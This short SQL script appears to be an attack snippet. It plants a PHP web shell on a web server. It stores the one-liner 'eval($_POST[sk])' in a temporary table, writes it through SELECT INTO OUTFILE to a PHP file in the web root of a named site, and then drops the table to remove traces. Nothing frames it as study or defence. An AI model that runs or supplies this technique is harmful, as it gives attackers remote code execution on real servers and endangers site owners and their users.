 Create TABLE xiaoma (xiaoma1 text NOT NULL);
 Insert INTO xiaoma (xiaoma1) VALUES('<?php eval($_POST[sk])?>');
 select xiaoma1 from xiaoma into outfile '/data/virtualhost/tp-shop.cn/demo5/wwwroot/indexx.php';
 Drop TABLE IF EXISTS xiaoma;